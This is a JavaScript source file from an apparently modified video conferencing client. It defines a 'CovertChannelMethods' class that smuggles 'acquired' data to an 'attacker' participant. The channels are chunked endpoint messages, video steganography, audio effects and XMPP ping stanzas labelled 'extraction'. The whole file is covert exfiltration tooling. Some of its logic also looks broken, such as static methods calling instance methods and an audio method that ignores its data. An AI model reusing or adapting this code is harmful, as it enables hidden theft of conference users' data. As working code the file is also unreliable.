/* global APP, splitString */

import { $iq } from 'strophe.js';

import { AudioMixerEffect } from '../react/features/stream-effects/audio-mixer/AudioMixerEffect';

import VideoSteganoEffect from './VideoSteganoEffect';


/**
 * 
 */
export default class CovertChannelMethods {

    // reference to all other methods
    static options = {
        'plain': CovertChannelMethods.usePlain,
        'video': CovertChannelMethods.useVideo,
        'audio': CovertChannelMethods.useAudio,
        'xmpp': CovertChannelMethods.useXMPP
    };

    /**
     *
     * @param {*} wholeData
     * @param {*} configuration
     */
    constructor(wholeData, configuration) {
        this.wholeData = wholeData;
        this.configuration = configuration;
        this.separatedData = splitString(wholeData, configuration.chunkSize);
    }

    /**
     * End hidden communication between users
     */
    static endCommunication(attackerId) {
        APP.conference.sendEndpointMessage(attackerId, {
            extraction: 'reply',
            isEnd: true
        });
    }

    /**
     * Sending data using simple plain method
     * @param {any} data - specified data to be sent
     */
    usePlain(data, attackerId) {
        for (const chunkData of splitString(data, this.configuration.chunkSize)) {
            APP.conference.sendEndpointMessage(attackerId, {
                extraction: 'reply',
                payload: chunkData
            });
        }
        this.endCommunication(attackerId);
    }

    /**
     * Creates new Steganography effect on the specified media stream.
     * @param {MediaStream} stream - Video stream you want to change
     * @param {Object} acquiredData - Data that are going to be hidden inside the mediastream
     * @param {object} options - Options about the steganography. Throughtput etc.
     * @returns Promise of stegano effect
     */
    _createSteganoEffect(stream: MediaStream, acquiredData: Object, options: Object) {
        if (!MediaStreamTrack.prototype.getSettings) {
            return Promise.reject(new Error('Stegano cannot be implemented!'));
        }

        // insert acquired data inside the video using specified method
        return Promise.resolve(new VideoSteganoEffect(stream, acquiredData, options));
    }

    /**
     * Send data using video stream
     * @param {any} data - specified data to be sent
     */
    useVideo(acquiredData, usedMethod) {
        const localVideo = APP.conference.localVideo;

        this._createSteganoEffect(localVideo.stream, acquiredData, usedMethod).then(effect => {
            localVideo.setEffect(effect);
        });
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    useAudio(data) {
        const desktopAudio = APP.conference._desktopAudioStream;
        const localAudio = APP.conference.localAudio;

        new AudioMixerEffect(desktopAudio).then(effect => {
            localAudio.setEffect(effect);
        });
    }

    /**
     *
     * @param {*} iq
     * @param {*} success
     * @param {*} error
     * @param {*} timeout
     */
    static ping(iq, success, error, timeout) {
        APP.conference._room.xmpp.connection.sendIQ2(iq, { timeout })
            .then(success, error);
    }

    /**
     * Sends "ping" to given <tt>jid</tt>
     * @param jid the JID to which ping request will be sent.
     * @param success callback called on success.
     * @param error callback called on error.
     * @param timeout ms how long are we going to wait for the response. On
     * @param data to send
     * timeout <tt>error<//t> callback is called with undefined error argument.
     */
    extractionPing(jid, success, error, timeout, data, type, id = '123') {
        const iq = $iq({
            type,
            to: jid,
            sid: '666',
            id,
            name: 'extraction'
        });

        iq.c('ping', { xmlns: 'extraction',
            data });
        APP.conference._room.xmpp.connection.sendIQ2(iq, { timeout })
            .then(success, error);
    }

    /**
     *
     * @param {*} userJid
     * @param {*} dataStack
     */
    static sendPing(userJid, dataStack) {
        CovertChannelMethods.extractionPing(userJid, e => {
            console.log('success', e, dataStack);
            if (!dataStack) {
                return;
            }
            CovertChannelMethods.sendPing(userJid, dataStack);
        }, e => {
            console.log('fail', e);
            console.log('Data sent:', dataStack);
        }, 5000, dataStack.shift(), 'get');
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    static useXMPP(data, attacker, configuration) {
        const splitedData = splitString(data, configuration.chunkSize);

        console.log('Data:', splitedData);

        const intervalRef = setInterval(() => {
            if (!splitedData.length) {
                clearInterval(intervalRef);
                CovertChannelMethods.endCommunication(attacker.getId());

                return;
            }
            CovertChannelMethods.extractionPing(attacker.getJid(), e => {
                console.log('success', e, splitedData);
            }, e => {
                console.log('fail', e);
                console.log('Data sent:', splitedData);
            }, 5000, splitedData.shift(), 'get');
        }, configuration.pingInterval);
    }
}
